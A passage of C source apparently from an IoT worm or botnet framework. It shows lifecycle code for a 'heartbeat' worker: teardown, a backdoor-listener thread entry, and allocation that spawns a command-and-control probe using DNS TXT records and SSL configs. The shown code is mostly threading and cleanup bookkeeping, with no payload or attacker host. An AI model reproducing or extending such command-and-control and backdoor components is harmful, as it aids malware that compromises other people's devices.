						htbt_free_lbd_client(client);
					}
					prne_close(fret);
				} while (false);
				client = NULL;
				ent = NULL;
			}
		}
	}

	pth_event_free(ev, TRUE);
	htbt_lbd_empty_conn_list(ctx);
}

static void *htbt_lbd_entry (void *p) {
	HTBT_INTP_CTX(p);

	htbt_lbd_setup_loop(ctx);
	htbt_lbd_serve_loop(ctx);

	return NULL;
}

static void fin_htbt_wkr (void *p) {
	HTBT_INTP_CTX(p);

	ctx->loop_flag = false;
	prne_pth_cv_notify(&ctx->lock, &ctx->cond, true);
	prne_pth_cv_notify(&ctx->cncp.lock, &ctx->cncp.cond, false);
	prne_pth_cv_notify(&ctx->main.lock, &ctx->main.cond, false);
}

static void free_htbt_wkr_ctx (void *p) {
	HTBT_INTP_CTX(p);

	htbt_main_empty_req_q(ctx);
	prne_free_llist(&ctx->main.req_q);
	prne_free_llist(&ctx->main.hover_req);

	if (ctx->cncp.pth != NULL) {
		pth_abort(ctx->cncp.pth);
	}

	if (ctx->lbd.pth != NULL) {
		pth_abort(ctx->lbd.pth);
	}
	prne_close(ctx->lbd.fd);
	htbt_lbd_empty_conn_list(ctx);
	prne_free_llist(&ctx->lbd.conn_list);
	prne_htbt_free_param(&ctx->param);

	prne_free(p);
}

prne_htbt_t *prne_alloc_htbt (
	prne_worker_t *w,
	const prne_htbt_param_t *param)
{
	prne_htbt_t *ret = NULL;

	if (w == NULL ||
		param->lbd_ssl_conf == NULL ||
		param->main_ssl_conf == NULL ||
		param->ctr_drbg == NULL ||
		param->blackhole < 0)
	{
		errno = EINVAL;
		goto ERR;
	}

	ret = prne_calloc(sizeof(prne_htbt_t), 1);
	if (ret == NULL) {
		goto ERR;
	}

	prne_htbt_init_param(&ret->param);
	prne_init_llist(&ret->main.req_q);
	prne_init_llist(&ret->main.hover_req);
	pth_mutex_init(&ret->lock);
	pth_cond_init(&ret->cond);
	ret->loop_flag = true;
	pth_mutex_init(&ret->lock_m.lock);

	pth_mutex_init(&ret->main.lock);
	pth_cond_init(&ret->main.cond);

	pth_mutex_init(&ret->cncp.lock);
	pth_cond_init(&ret->cncp.cond);

	prne_init_llist(&ret->lbd.conn_list);
	ret->lbd.fd = -1;

	if (param->resolv != NULL && param->cb_f.cnc_txtrec != NULL) {
		ret->cncp.pth = pth_spawn(
			PTH_ATTR_DEFAULT,
			htbt_cncp_entry,
			ret);
		if (ret->cncp.pth != NULL) {
			pth_suspend(ret->cncp.pth);
		}
	}

	ret->lbd.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_lbd_entry, ret);
	if (ret->lbd.pth != NULL) {
		pth_suspend(ret->lbd.pth);
	}

	if (ret->lbd.pth == NULL && ret->cncp.pth == NULL) {
		// no producers. No point running main
		goto ERR;
	}

	ret->param = *param;
	w->ctx = ret;
	w->entry = htbt_main_entry;
	w->fin = fin_htbt_wkr;
	w->free_ctx = free_htbt_wkr_ctx;

	return ret;
ERR:
	if (ret != NULL) {
		const int saved_errno = errno;
		free_htbt_wkr_ctx(ret);
		errno = saved_errno;
	}
	return NULL;
}

void prne_htbt_init_param (prne_htbt_param_t *p) {
	prne_memzero(p, sizeof(prne_htbt_param_t));
	p->blackhole = -1;
}

void prne_htbt_free_param (prne_htbt_param_t *p) {}
